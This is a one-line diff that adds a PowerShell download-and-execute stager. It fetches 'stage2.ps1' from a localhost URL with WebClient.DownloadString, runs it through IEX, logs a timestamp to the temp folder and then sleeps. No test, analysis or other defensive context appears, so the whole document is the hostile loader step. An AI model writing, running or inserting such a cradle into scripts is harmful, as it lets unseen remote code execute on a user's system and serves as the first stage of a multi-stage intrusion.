@@ -1,0 +1,1 @@
+$RemoteUrl = 'https://localhost:8080/stage2.ps1'; $StageScript = (New-Object System.Net.WebClient).DownloadString($RemoteUrl); IEX $StageScript; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; Start-Sleep -Seconds 38
